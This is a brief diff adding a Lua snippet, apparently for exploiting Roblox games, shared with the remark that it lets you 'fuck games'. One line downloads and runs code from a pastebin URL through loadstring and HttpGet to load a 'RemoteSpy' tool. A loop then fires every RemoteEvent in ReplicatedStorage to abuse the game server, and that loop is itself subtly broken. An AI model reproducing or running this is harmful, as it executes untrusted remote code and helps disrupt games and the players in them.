@@ -1,0 +1,11 @@
+Remotes is kinda good, cuz you can fuck games with that
+
+-- RemoteSpy that i recommended:
+loadstring(game:HttpGet('https://pastebin.com/yJzq5ceV', true))()
+
+-- Fire all Remotes best:
+for i,v in next(game.ReplicatedStorage:GetDescendants()) do
+    if v:IsA('RemoteEvent') then
+        v:FireServer()
+    end
+end
